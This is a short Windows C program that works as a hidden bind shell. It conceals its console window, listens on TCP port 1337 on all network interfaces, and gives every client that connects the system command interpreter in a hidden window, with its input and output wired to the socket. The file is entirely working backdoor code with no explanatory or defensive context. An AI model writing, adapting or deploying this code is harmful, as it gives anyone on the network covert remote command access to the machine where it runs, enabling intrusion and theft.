#include <Winsock2.h>
#pragma comment(lib, "Ws2_32.lib")


int main( int argc, char ** argv )
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow( hWnd, SW_HIDE );
    WSADATA WSAData;
    SOCKADDR_IN sin;
    SOCKET sock;
    WSAStartup( MAKEWORD( 2, 0 ), &WSAData );


    sock = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0 );
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl( INADDR_ANY );
    sin.sin_port = htons( ( u_short )1337 );


    bind( sock, ( SOCKADDR * )&sin, sizeof( SOCKADDR_IN ) );
    listen( sock, SOMAXCONN );


    while( 1 )
   {
        SOCKET tmp = accept( sock, 0, 0 );
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        char buff[ 2010 ];


        si.cb = sizeof( si );
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = ( HANDLE )tmp;
        si.hStdError = ( HANDLE )tmp;
        si.hStdInput = ( HANDLE )tmp;


        GetEnvironmentVariable( "COMSPEC", buff, 2000 );


        CreateProcess( buff, 0, 0, 0, 1, CREATE_NEW_CONSOLE, 0, 0, &si, &pi );


        CloseHandle( pi.hProcess );
        CloseHandle( pi.hThread );
        closesocket( tmp );
    }
    return( 0 );
}